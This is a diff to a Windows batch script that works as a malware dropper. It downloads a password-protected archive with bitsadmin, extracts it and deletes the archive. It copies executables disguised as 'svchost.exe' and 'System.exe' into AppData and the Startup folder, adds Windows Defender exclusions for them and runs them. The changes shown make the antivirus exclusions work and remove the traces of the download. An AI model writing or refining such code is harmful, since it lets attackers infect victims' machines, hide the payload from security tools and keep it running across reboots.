@@ -92,12 +92,14 @@ bitsadmin /transfer Packages /download /priority foreground https://github.com/s
 
 7z.exe x  winfiles.zip -pkali#241 -aos
 
+del winfiles.zip
+
 copy svchost.exe "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\
 
 
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\System.exe"
 
-Add-MpPreference -ExclusionProcess "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\System.exe"
+powershell Add-MpPreference -ExclusionProcess "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\System.exe"
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 System.exe
@@ -112,7 +114,7 @@ cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows
 
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\svchost.exe"
 
-Add-MpPreference -ExclusionProcess "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\svchost.exe"
+powershell Add-MpPreference -ExclusionProcess "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\svchost.exe"
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows
 svchost.exe
